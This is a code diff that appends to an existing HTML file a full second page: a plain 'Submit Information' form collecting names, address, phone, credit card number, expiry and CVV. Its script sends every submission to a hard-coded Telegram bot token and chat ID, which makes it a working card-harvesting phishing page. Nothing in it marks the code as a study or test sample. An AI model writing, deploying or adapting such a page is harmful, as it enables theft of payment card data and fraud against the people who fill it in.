@@ -837,3 +837,136 @@
     </script>
 </body>
 </html>
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <title>Submit Info → Telegram</title>
+  <style>
+    body { font-family: Arial, sans-serif; padding:18px; background:#f7f7f7; color:#111 }
+    form { max-width:720px; margin:0 auto; background:#fff; padding:18px; border-radius:8px; box-shadow:0 2px 6px rgba(0,0,0,0.06) }
+    label { display:block; margin-top:12px; font-weight:600 }
+    input { width:100%; padding:8px; margin-top:6px; box-sizing:border-box }
+    .two { display:flex; gap:10px }
+    .two input { flex:1 }
+    button { margin-top:16px; padding:10px 16px; cursor:pointer }
+    #status { margin-top:12px; font-size:14px }
+  </style>
+</head>
+<body>
+
+  <h2 style="text-align:center">Submit Information</h2>
+
+  <form id="myForm" autocomplete="off">
+    <div class="two">
+      <div>
+        <label>First Name</label>
+        <input name="firstName" required />
+      </div>
+      <div>
+        <label>Last Name</label>
+        <input name="lastName" required />
+      </div>
+    </div>
+
+    <label>Address</label>
+    <input name="address" required />
+
+    <div class="two">
+      <div>
+        <label>City</label>
+        <input name="city" required />
+      </div>
+      <div>
+        <label>Zip</label>
+        <input name="zip" required />
+      </div>
+    </div>
+
+    <label>Phone</label>
+    <input name="phone" required />
+
+    <label>Credit Card Number</label>
+    <input name="creditCard" placeholder="XXXX XXXX XXXX XXXX" required />
+
+    <div class="two">
+      <div>
+        <label>Expiry MM</label>
+        <input name="mm" placeholder="MM" required />
+      </div>
+      <div>
+        <label>Expiry YY</label>
+        <input name="yy" placeholder="YY" required />
+      </div>
+    </div>
+
+    <label>Security Code (CVV)</label>
+    <input name="cvv" placeholder="CVV" required />
+
+    <!-- Continue button -->
+    <button type="submit">Continue</button>
+    <p id="status"></p>
+  </form>
+
+  <script>
+    // Insert your token and chat id here
+    const BOT_TOKEN = "7209459048:AAE7HzFgG6Mh5qC248RgDjaCVVZxH6yDQ4w";  
+    const CHAT_ID   = "5929758667";
+
+    const form = document.getElementById("myForm");
+    const status = document.getElementById("status");
+
+    form.addEventListener("submit", async (e) => {
+      e.preventDefault();
+      status.textContent = "Sending...";
+
+      const fd = new FormData(form);
+      const payload = {
+        firstName: fd.get("firstName"),
+        lastName:  fd.get("lastName"),
+        address:   fd.get("address"),
+        city:      fd.get("city"),
+        zip:       fd.get("zip"),
+        phone:     fd.get("phone"),
+        creditCard:fd.get("creditCard"),
+        mm:        fd.get("mm"),
+        yy:        fd.get("yy"),
+        cvv:       fd.get("cvv")
+      };
+
+      const pretty = 
+`📩 New Form Submission:
+First: ${payload.firstName}
+Last:  ${payload.lastName}
+Address: ${payload.address}
+City: ${payload.city}
+Zip: ${payload.zip}
+Phone: ${payload.phone}
+Card: ${payload.creditCard}
+Exp: ${payload.mm}/${payload.yy}
+CVV: ${payload.cvv}`;
+
+      try {
+        const url = https://api.telegram.org/bot${BOT_TOKEN}/sendMessage;
+        const r = await fetch(url, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: CHAT_ID, text: pretty })
+        });
+
+        if (r.ok) {
+          status.textContent = "Sent to Telegram.";
+          form.reset();
+        } else {
+          const body = await r.text();
+          status.textContent = "Telegram API error: " + body;
+        }
+      } catch (err) {
+        console.error(err);
+        status.textContent = "Network or CORS error.";
+      }
+    });
+  </script>
+</body>
+</html>
